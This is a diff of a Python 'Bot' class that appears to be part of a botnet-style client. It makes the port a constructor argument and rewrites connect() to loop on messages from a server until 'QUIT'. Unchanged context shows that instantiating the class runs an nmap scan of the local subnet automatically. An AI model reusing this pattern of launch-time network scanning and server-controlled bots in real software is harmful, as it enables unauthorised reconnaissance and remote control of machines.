@@ -10,22 +10,24 @@ import urllib
 
 class Bot:
 
+    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     BLOCK_SIZE = 16
     PADDING = '\0'
     
-    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    port = '9999'
-    
-    def __init__(self):
+        
+    def __init__(self, port):
+        self.port = port
         self.key = Random.new().read(self.BLOCK_SIZE)
         self.scan_network()
 
 
     def connect(self, serv, portNum):
-        try:
-            self.SERVER.connect((serv, portNum))
-        except:
-            print("[-] Could Not Connect")    
+        self.SERVER.connect((serv, int(portNum)))
+        while True:
+            data = self.SERVER.recv(1024)
+            print data
+            if data.find('QUIT') != -1:
+                break
 
 
     def send_message(self, message):
@@ -86,7 +88,7 @@ class Bot:
         s.close()
         return ip
 
-    
+
     def scan_network(self):
         nm = nmap.PortScanner()
         ip_range = self.get_local_ip()[:-2] + '.0/24'
@@ -103,4 +105,4 @@ class Bot:
             except:
                 print("%s \tClosed" % host)
 
-bot = Bot()
+bot = Bot('9999')
